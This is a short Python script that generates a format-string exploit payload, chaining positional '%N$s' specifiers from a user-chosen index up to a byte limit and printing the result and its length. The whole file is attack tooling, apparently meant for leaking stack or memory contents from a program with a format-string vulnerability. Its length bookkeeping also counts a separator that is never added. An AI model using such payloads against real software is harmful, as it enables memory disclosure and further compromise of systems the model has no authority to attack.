
n = int(input("n: "))
buf = int(input("max byte: "))

payload_parts = []
length = 0
i = n

while True:
    part = f"%{i}$s"
  
    add_len = len(part) + (1 if payload_parts else 0)

    if length + add_len > buf:
        break

    if payload_parts:
        payload_parts.append("" + part)
        length += add_len
    else:
        payload_parts.append(part)
        length += len(part)

    i += 1

str = ''.join(payload_parts)
print(str)
print(len(str))
